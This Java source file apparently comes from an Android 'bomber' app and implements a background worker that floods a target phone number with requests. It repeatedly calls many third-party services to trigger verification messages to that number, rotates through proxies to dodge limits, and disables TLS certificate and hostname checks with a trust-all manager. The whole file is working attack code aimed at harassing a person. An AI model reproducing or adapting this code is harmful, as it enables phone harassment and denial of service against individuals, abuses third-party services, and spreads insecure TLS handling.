package com.dm.bomber.workers;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.dm.bomber.R;
import com.dm.bomber.services.Service;
import com.dm.bomber.services.Services;
import com.dm.bomber.ui.MainRepository;

import org.jetbrains.annotations.NotNull;

import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackWorker extends Worker {

    private static final String TAG = "Attack";

    public static final String KEY_COUNTRY_CODE = "country_code";
    public static final String KEY_PHONE = "phone";
    public static final String KEY_REPEATS = "repeats";
    public static final String KEY_PROXY_ENABLED = "proxy_enabled";

    public static final String KEY_PROGRESS = "progress";
    public static final String KEY_MAX_PROGRESS = "max_progress";

    private static final String CHANNEL_ID = "attack";

    private int progress = 0;

    private CountDownLatch tasks;
    private boolean stopped;

    @SuppressLint({"CustomX509TrustManager", "TrustAllX509TrustManager"})
    private final TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return new java.security.cert.X509Certificate[]{};
                }
            }
    };

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .callTimeout(7, TimeUnit.SECONDS)
            .addInterceptor(chain -> {
                Request request = chain.request();
                Log.v(TAG, String.format("Sending request %s", request.url()));

                Response response = chain.proceed(request);
                Log.v(TAG, String.format("Received response for %s with status code %s",
                        response.request().url(), response.code()));

                return response;
            });

    public AttackWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

        setProgressAsync(new Data.Builder()
                .putInt(KEY_PROGRESS, 0)
                .putInt(KEY_MAX_PROGRESS, 0)
                .build());
    }

    @NonNull
    @Override
    public Result doWork() {

        try {
            SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

            clientBuilder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
            clientBuilder.hostnameVerifier((hostname, session) -> true);

        } catch (KeyManagementException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        OkHttpClient client = clientBuilder.build();

        List<AuthableProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
                new MainRepository(getApplicationContext()).getProxy() : new ArrayList<>();

        String countryCode = getInputData().getString(KEY_COUNTRY_CODE);
        String phone = getInputData().getString(KEY_PHONE);

        int repeats = getInputData().getInt(KEY_REPEATS, 1);

        assert countryCode != null;
        assert phone != null;

        List<Service> usableServices = Services.getUsableServices(countryCode);
        Log.i(TAG, String.format("Starting attack on +%s%s", countryCode, phone));

        client = client.newBuilder()
                .proxy(null)
                .build();

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getApplicationContext().getString(R.string.attack);
            String description = getApplicationContext().getString(R.string.channel_description);

            int importance = NotificationManager.IMPORTANCE_LOW;

            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            notificationManager.createNotificationChannel(channel);
        }

        attack:
        for (int cycle = 0; cycle < repeats; cycle++) {
            Log.i(TAG, String.format("Started cycle %s", cycle));
            tasks = new CountDownLatch(usableServices.size());

            if (!proxies.isEmpty()) {
                AuthableProxy authableProxy = proxies.get(cycle % proxies.size());

                client = client.newBuilder()
                        .proxy(authableProxy)
                        .proxyAuthenticator(authableProxy)
                        .build();
            }

            for (Service service : usableServices) {

                if (isStopped()) {
                    break attack;
                }

                try {
                    service.prepare(countryCode, phone);
                    service.run(client, new com.dm.bomber.services.Callback() {
                        @Override
                        public void onError(Exception e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);
                            tasks.countDown();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            if (!stopped) {
                                Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                                        .setContentTitle(getApplicationContext().getString(R.string.attack))
                                        .setContentText("+" + countryCode + phone)
                                        .setProgress(usableServices.size() * repeats, progress, false)
                                        .setStyle(new NotificationCompat.BigTextStyle())
                                        .setSmallIcon(R.drawable.logo)
                                        .build();

                                notificationManager.notify(getId().hashCode(), notification);

                                setProgressAsync(new Data.Builder()
                                        .putInt(KEY_PROGRESS, progress++)
                                        .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
                                        .build());
                            }

                            tasks.countDown();
                        }
                    });
                } catch (StringIndexOutOfBoundsException e) {
                    Log.w(TAG, String.format("%s could not process the number", service.getClass().getName()));
                }

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            try {
                tasks.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        stopped = true;
        notificationManager.cancel(getId().hashCode());

        Log.i(TAG, String.format("Attack on +%s%s ended", countryCode, phone));
        return Result.success();
    }
}
